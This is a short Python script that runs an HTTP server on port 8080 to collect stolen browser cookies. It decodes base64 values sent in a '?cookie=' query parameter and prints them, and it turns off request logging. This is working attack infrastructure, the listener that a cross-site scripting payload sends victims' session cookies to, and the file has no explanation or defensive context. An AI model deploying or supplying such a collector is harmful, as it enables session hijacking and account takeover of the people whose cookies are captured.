from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import b64decode

class RequestHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        path = self.path
        cookie = b64decode(path.split('?cookie=')[1]).decode()
        print(cookie)
        self.send_response(200)

    def log_message(self, format, *args):
        return
        
def main():
    ip = '0.0.0.0'
    port = 8080
    server = HTTPServer((ip, port), RequestHandler)
    server.serve_forever()

        
if __name__ == "__main__":
    main()
